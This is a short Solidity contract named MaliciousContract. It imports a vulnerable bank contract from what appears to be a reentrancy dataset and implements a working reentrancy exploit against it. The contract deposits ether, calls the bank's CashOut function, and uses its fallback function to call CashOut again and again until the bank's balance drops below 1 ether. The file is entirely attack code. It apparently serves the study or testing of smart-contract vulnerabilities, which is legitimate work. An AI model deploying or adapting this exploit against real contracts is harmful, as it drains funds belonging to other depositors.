
pragma solidity ^0.4.19;
import "../dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol";

contract MaliciousContract{
    Private_Bank private_Bank;
    

    constructor(address _private_Bank) public{
        private_Bank= Private_Bank (_private_Bank);
    }

   function attack(uint amount) public {
        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
        private_Bank.CashOut(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        private_Bank.Deposit.value(msg.value)();        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(private_Bank).balance >= 1 ether) {
            private_Bank.CashOut(1 ether);
        }
    }
}
